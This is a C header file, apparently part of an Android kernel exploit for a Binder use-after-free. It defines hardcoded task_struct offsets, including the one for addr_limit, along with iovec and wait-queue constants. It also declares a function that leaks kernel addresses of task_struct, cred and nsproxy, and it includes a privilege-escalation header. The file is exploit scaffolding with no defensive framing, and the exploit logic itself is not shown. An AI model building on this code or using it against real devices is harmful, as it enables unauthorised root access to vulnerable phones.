#ifndef BINDER_UAF_H
#define BINDER_UAF_H

#include "../include/binder.h"
#include "../include/privilege_escalation.h"
#include <stdint.h>
#include <sys/types.h>

#define TASK_STRUCT_OFFSET_IN_LEAKED_DATA 0xE8
#define OFFSET_TASK_STRUCT_PID 0x4E8
#define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18

#define PAGE_SIZE 4096

#define IOVEC_COUNT 25
#define IOVEC_WQ_INDEX 10

void binder_uaf_leak_task_struct(int binder_fd,
                                 struct task_struct **leak_task_struct,
                                 void **leak_pid_address,
                                 void **leak_cred_address,
                                 void **leak_nsproxy_address,
                                 void **mapped_memory);

#endif